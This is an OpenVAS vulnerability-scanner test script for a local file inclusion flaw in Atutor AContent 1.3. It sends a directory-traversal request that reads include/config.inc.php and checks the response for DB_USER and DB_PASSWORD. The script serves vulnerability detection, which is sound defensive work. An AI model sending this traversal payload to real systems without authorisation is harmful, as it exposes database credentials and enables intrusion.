###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atutor_acontent_lfi_vuln.nasl 6093 2017-05-10 09:03:18Z teissa $
#
# Atutor AContent Local File Inclusion Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803346");
  script_version("$Revision: 6093 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-10 11:03:18 +0200 (Wed, 10 May 2017) $");
  script_tag(name:"creation_date", value:"2013-03-26 15:10:47 +0530 (Tue, 26 Mar 2013)");
  script_name("Atutor AContent Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/83018");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24869");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/acontent-13-local-file-inclusion");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected
  application.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Atutor AContent version 1.3");
  script_tag(name : "insight" , value : "The flaw is due to an input validation error in 'url' parameter
  to '/oauth/lti/common/tool_provider_outcome.php' script.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is installed with Atutor AContent and is prone to
  local file inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Check for each possible path
foreach dir (make_list_unique("/", "/AContent", "/Atutor/AContent", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  req = http_get(item:string(dir,"/home/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if('>AContent</' >< res)
  {
    url = dir +'/oauth/lti/common/tool_provider_outcome.php?grade=1&key=1&'+
               'secret=secret&sourcedid=1&submit=Send%20Grade&url=../../../'+
               'include/config.inc.php';

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern: "AContent",
       extra_check: make_list("DB_USER","DB_PASSWORD")))
    {
      report = report_vuln_url( port:port, url:url );
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);